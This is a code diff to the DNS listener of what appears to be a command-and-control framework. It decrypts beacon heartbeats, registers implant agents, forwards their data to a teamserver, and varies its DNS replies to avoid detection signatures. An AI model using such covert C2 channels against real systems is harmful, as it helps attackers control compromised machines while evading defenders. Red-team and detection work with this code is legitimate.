@@ -164,11 +164,14 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
 					if len(keyBytes) == 16 && len(dataB) >= 8 {
 						if c, e := rc4.NewCipher(keyBytes); e == nil {
-							beat := make([]byte, len(dataB))
-							c.XORKeyStream(beat, dataB)
-							if len(beat) >= 8 {
-								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(beat[:4]))
-								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(beat[4:8]))
+							fullBeat := make([]byte, len(dataB))
+							c.XORKeyStream(fullBeat, dataB)
+							if len(fullBeat) >= 8 {
+								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
+								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
+								// HTTP 通道会把前 8 字节 (type+id) 剥离后再传给 AgentCreate，
+								// DNS 这里也保持同样格式，只把剩余部分作为 beat 传入。
+								beat := fullBeat[8:]
 								if !d.ts.TsAgentIsExists(agentId) {
 									externalIP := ""
 									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
@@ -184,11 +187,13 @@ func (d *DNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 						}
 					}
 				}
-				// 将payload交给 TS，sid 作为逻辑会话 ID（要求 Beacon 端保持一致）
-				if dnsDebug {
-					fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
+				// PUT：将payload交给 TS，sid 作为逻辑会话 ID（要求 Beacon 端保持一致）
+				if op == "PUT" {
+					if dnsDebug {
+						fmt.Printf("[BeaconDNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
+					}
+					_ = d.ts.TsAgentProcessData(sid, dataB)
 				}
-				_ = d.ts.TsAgentProcessData(sid, dataB)
 			}
 			// ACK：返回一个最小响应（不同 QType 返回不同 RR，以降低特征）
 			if qtype == "A" {
